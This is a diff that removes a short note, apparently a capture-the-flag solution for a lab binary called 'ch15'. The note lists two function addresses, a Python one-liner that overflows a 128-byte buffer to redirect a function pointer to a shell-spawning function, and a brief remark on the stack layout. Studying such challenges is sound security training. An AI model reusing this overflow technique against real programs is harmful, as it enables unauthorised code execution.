@@ -1,7 +1,0 @@
-shell_faddr = 0x08048516
-sup_faddr = 0x08048559
- 
-(python -c 'print "a" * 128 + "\x16\x85\x04\x08"'; cat) | ./ch15
-
-not use overwrite rip because fgets input 133 char but string in addr = [ebp - 0x8c]
-
